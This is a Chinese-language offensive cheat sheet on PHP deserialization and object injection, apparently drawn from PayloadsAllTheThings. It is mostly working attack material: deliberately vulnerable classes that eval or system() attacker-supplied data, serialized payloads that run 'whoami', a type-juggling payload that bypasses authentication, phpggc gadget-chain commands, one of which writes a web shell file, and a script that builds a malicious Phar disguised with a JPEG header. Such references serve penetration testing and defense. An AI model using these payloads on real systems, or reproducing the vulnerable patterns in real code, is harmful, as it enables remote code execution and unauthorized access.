# PHP Deserialization - PHP反序列化漏洞

[SEARCH_KEYWORDS]
漏洞类型: Deserialization PHP Object Injection 反序列化 对象注入
攻击类型: Remote Code Execution SQL Injection Path Traversal
关键词: PHP unserialize serialize __wakeup __destruct __toString
技术: POP Chain Gadget Chain Phar Type Juggling
工具: phpggc
魔法方法: __wakeup __destruct __toString __construct

[CONTENT]

## PHP反序列化概述

PHP对象注入是一种应用程序级漏洞，允许攻击者执行代码注入、SQL注入、路径遍历等攻击。漏洞发生在用户输入未正确清理就传递给unserialize()函数时。

## 魔法方法

| 方法 | 触发时机 |
|------|----------|
| `__wakeup()` | 对象反序列化时 |
| `__destruct()` | 对象销毁时 |
| `__toString()` | 对象转字符串时 |
| `__construct()` | 对象创建时 |
| `__call()` | 调用不存在方法时 |
| `__get()` | 读取不可访问属性时 |
| `__set()` | 写入不可访问属性时 |
| `__invoke()` | 对象作为函数调用时 |

## 漏洞代码示例

```php
<?php
    class PHPObjectInjection{
        public $inject;
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){
        $var1=unserialize($_REQUEST['r']);
    }
?>
```

## 基本Payload

### 基本序列化数据

```php
a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
```

### 命令执行

```php
O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}
```

## 认证绕过

### Type Juggling

漏洞代码:

```php
<?php
$data = unserialize($_COOKIE['auth']);
if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
}
```

Payload:

```php
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

原理: `true == "str"` 为真。

## 对象注入

漏洞代码:

```php
<?php
class ObjectExample {
  var $guess;
  var $secretCode;
}
$obj = unserialize($_GET['input']);
if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```

Payload:

```php
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```

## POP Gadgets (PHPGGC)

[ambionics/phpggc](https://github.com/ambionics/phpggc)支持多种框架:

```powershell
phpggc monolog/rce1 'phpinfo();' -s
phpggc monolog/rce1 assert 'phpinfo()'
phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
```

支持框架: Laravel, Symfony, SwiftMailer, Monolog, SlimPHP, Doctrine, Guzzle

## Phar反序列化

使用`phar://`包装器触发反序列化:

```php
file_get_contents("phar://./archives/app.phar")
```

### 创建恶意Phar

```php
<?php
class AnyClass {
    public $data = null;
    function __destruct() {
        system($this->data);
    }
}

$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>"); // JPEG header

$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
?>
```

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Deserialization/PHP.md